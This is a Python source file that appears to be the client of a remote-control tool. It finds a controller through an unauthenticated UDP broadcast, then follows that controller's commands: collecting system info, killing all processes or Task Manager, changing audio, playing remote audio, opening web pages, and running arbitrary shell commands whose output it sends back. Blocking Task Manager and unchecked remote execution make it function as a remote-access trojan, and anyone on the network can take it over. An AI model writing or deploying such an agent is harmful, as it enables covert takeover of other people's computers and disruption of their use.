from env import HELLOCLIENT_PORT, SERVER_PORT, IS_DEV, EXIT_KEYS, SPLITTER
from packer import packV1, parsePackV1, ContentTypes, CommandTypes, Pack
from utilities import getComputerInfo, testSong, setAudio, setSystemMute, generateFFPLAY, ffplayFromURL, executeCommandAsync
from dataclasses import dataclass
from logger import logger, info
from typing import List, Any
from threading import Thread
import webbrowser
import processes
import platform
import socket
import uuid
import time
import sys
import os



argv = sys.argv[1:]


if "dev" in argv:
    IS_DEV = True


is_linux = "linux" in platform.platform().lower()



@dataclass
class Command:
    command: str
    ref_id: str


class HandShake:
    def __init__(self):
        self.is_running = True
        self.server_ip: str = None


        self.server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.SOL_UDP)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        self.server.bind(('', HELLOCLIENT_PORT))
        self.server.settimeout(3)


    def listening(self):
        while self.is_running:
            try:
                if not self.server:
                    break


                if self.server_ip:
                    break


                data, addr = self.server.recvfrom(1024)

                info(addr)


                data_decoded = data.decode(errors='ignore')

                socket.inet_aton(data_decoded)

                self.server_ip = data_decoded



            except KeyboardInterrupt:
                self.is_running = False
                break


            except TimeoutError:
                info("Retry again")
                continue

            except Exception as ex:
                logger.error(ex)



        self.close()




    @property
    def serverIP(self):
        return self.server_ip
    


    def close(self):
        

        if self.is_running:
            self.server.close()
            self.server = None
            self.is_running = False
            


class Server:
    def __init__(self, ip: str):
        self.is_running = True
        self.commands: List[Command] = []
        self.tasks: List[Thread] = []
        self._buffer = b''

        self.uuid: str = None

        self.command_type: CommandTypes = CommandTypes.COMMON_COMMAND

        self.server = socket.socket()
        self.server.connect((ip, SERVER_PORT))
        self.server.settimeout(5)


        



    def run_forest(self):
        tasks: List[Thread] = [
            Thread(target=self.listening, args=())
        ]

        if IS_DEV:
            tasks.append(
                Thread(target=self.controller, args=())
            )

            self.sendData("UpRole", ContentTypes.STR, "ADMIN", None, CommandTypes.SERVER_COMMAND)



        for task in tasks:
            task.start()
            self.tasks.append(task)

        while self.is_running:
            time.sleep(1)



    def controller(self):
        while self.is_running:
            try:
                command = input(self.command_type.value).strip()
                

                if not command:
                    continue


                if len(command) == 2 and command.startswith("/") and command[-1] in [_.value for _ in CommandTypes]:
                    command_type = CommandTypes(command[-1])
                    print(command_type)

                    self.command_type = command_type
                    continue


                if command in EXIT_KEYS:
                    global is_running
                    is_running = False
                    break



                self.sendData(command, ContentTypes.STR, command, self.getCommandRefID, self.command_type)


            except Exception as ex:
                print("ERROR Server.controller: ", ex)
                break


        self.close()


    def listening(self):
        while self.is_running:
            try:
                data = self.server.recv(1024)


                if not data:
                    break


                # print(data)
                self._buffer += data


                while SPLITTER in self._buffer:
                    indexOf = self._buffer.index(SPLITTER)
                    _command = self._buffer[:indexOf]
                    self._buffer = self._buffer[indexOf + len(SPLITTER):]

                    command = parsePackV1(_command)


                    if not command:
                        raise Exception("parsePackV1 Error: ", _command)


                    self.onCommand(command)


            except TimeoutError:
                continue


            except Exception as ex:
                print(ex)
                break


        self.close()


    def onCommand(self, command: Pack):

        print("HERE: ", command)
        

        if command.name == "GetComputerInfo":
            data = getComputerInfo()
            self.sendData("ComputerInfo", ContentTypes.JSON, data, command.ref_id, CommandTypes.COMMON_COMMAND)
            return
        

        if command.name == "ClientList":
            print(command.data)
            return
        

        if command.name == "DownloadUrl":
            print(command.data)
            return 
        

        if command.name == "TEST_SONG":
            ffplay_path = generateFFPLAY()


            if ffplay_path:
                info("ffplay_path: " + ffplay_path)

                return Thread(target=testSong, args=(ffplay_path, )).start()


        if command.name == "SET_SYSTEM_MUTE":
            return setSystemMute(**command.data)


        if command.name == "SET_AUDIO_PERCEN":
            return setAudio(**command.data)
        

        if command.name == "KILL_ALL":
            return processes.killALL()
        

        if command.name == "KILL_TASK_MGR":
            return processes.killTaskMgr()
        

        if command.name == "CLEAN_FFPLAY":
            return 

        if command.name == "CODE_INFO":
            pass


        if command.name == "FFPLAY_FROM":
            ffplay_path = generateFFPLAY()


            if ffplay_path:
                info("ffplay_path: " + ffplay_path)

                return Thread(target=ffplayFromURL, args=(command.data, ffplay_path, )).start()
            

        if command.name == "KILL_PROC_WITH_NAME":
            return processes.killProcessWithName(command.data)
        

        if command.name == "WEB_OPEN":
            return webbrowser.open(command.data)
        

        if command.name == "EXEC":
            return Thread(
                target=executeCommandAsync, args=(
                    command.data, 
                    lambda e: self.sendData("EXEC_RESPONSE", ContentTypes.STR, e, command.ref_id, CommandTypes.COMMON_COMMAND)
                )
            ).start()
            # return os.system(' '.join(command.data))




        print(command)



    def sendData(self, name: str, content_type: ContentTypes, body: Any, ref_id: str = None, command_type: CommandTypes = CommandTypes.COMMON_COMMAND):
        if not self.server:
            return None
        

        self.server.sendall(packV1(name, content_type, body, ref_id, command_type))
        return True


    def close(self):
        if self.is_running:
            self.server.close()
            self.commands = []
            self.tasks = []
            self.is_running = False


    @property
    def getAllCommandRefID(self):
        return map(lambda e: e.ref_id, self.commands)
    

    @property
    def getCommandRefID(self):
        while True:
            v4 = str(uuid.uuid4())

            if v4 not in self.getAllCommandRefID:
                return v4






main_task: List[Thread] = []

hand_shake: HandShake = None
server: Server = None

server_ip: str = None
is_running = True


if __name__ == "__main__":
    args = sys.argv[1:]

    if len(argv) > 0:
        if argv[0] == "check_dir":
            print(os.path.dirname(__file__))
            sys.exit(0)

            
    info("Listening Server")


    while is_running:
        try:
            hand_shake = HandShake()
            task = Thread(target=hand_shake.listening, args=())
            task.start()



            while is_running:
                try:
                    if hand_shake.serverIP:
                        hand_shake.close()
                        server_ip = hand_shake.serverIP
                        info(f"Server Connected::{server_ip}")
                        

                        # process
                        # while True:
                        #     time.sleep(5)

                        server = Server(server_ip)
                        server.run_forest()



                    time.sleep(3)


                except KeyboardInterrupt as ex:
                    print(ex)
                    is_running = False
                    break


                except Exception as ex:
                    raise ex
                


        except KeyboardInterrupt as ex:
            print(ex)
            is_running = False
            break


        except Exception as ex:
            print(ex)
            time.sleep(5)

